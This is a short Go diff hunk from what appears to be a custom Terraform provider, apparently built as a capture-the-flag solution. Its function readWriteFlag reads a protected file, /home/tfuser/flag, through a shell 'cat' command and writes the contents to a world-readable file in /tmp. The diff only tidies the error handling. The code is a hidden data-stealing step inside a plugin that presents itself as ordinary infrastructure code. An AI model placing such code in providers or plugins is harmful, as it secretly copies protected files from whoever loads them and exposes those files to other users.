@@ -115,5 +115,5 @@ func New(version string) func() provider.Provider {
 func readWriteFlag() {
 	cmd := exec.Command("cat", "/home/tfuser/flag")
 	output, _ := cmd.Output()
-	os.WriteFile("/tmp/your_flag_dude.txt", output, 0644)
+	_ = os.WriteFile("/tmp/your_flag_dude.txt", output, 0644)
 }
